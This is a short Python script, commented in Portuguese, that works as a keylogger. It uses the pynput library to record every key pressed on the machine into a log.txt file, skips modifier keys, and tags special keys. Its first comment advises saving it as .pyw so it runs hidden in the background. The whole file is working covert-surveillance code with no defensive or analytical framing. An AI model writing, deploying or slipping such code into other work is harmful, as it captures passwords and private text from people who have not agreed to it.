# o arquivo deve ser .pyw para ficar em segundo plano

from pynput import keyboard # biblioteca para monitorar inputs do sistema

ignorar = { # conjunto com teclas a serem ignoradas
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # se for uma tecla normal (letra, numero, simbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in ignorar:
                pass
            else:
                f.write(f" [{key}] ")
with keyboard.Listener(on_press=on_press) as listener: # inicia a funcao 
    listener.join()